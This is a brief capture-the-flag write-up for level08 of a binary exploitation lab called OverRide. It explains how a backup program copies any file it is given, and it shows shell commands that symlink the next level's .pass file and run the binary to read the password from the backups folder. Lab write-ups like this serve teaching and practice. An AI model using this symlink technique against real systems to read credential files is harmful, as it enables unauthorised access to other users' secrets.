----- LS - EXEC -----

we have a backups folder with a .log file
we can run it but do nothing
note that When we pass a file, he will wrote inside the file in the .log, and if it succeed,
he will copy the file in backups

----- GDB -----

With gdb we can see that is a x64 bynary, 

For this level, we have a x64 binary
we can see a open function the program read a file


So i try to put a symbolic link to the .pass of the level09, pass the link
to the bin, and we have the flag in the backups folder.

level08@OverRide:~$ chmod 777 .
level08@OverRide:~$ ln -s /home/users/level09/.pass nextlevel
level08@OverRide:~$ ./level08 nextlevel
level08@OverRide:~$ cat backups/nextlevel
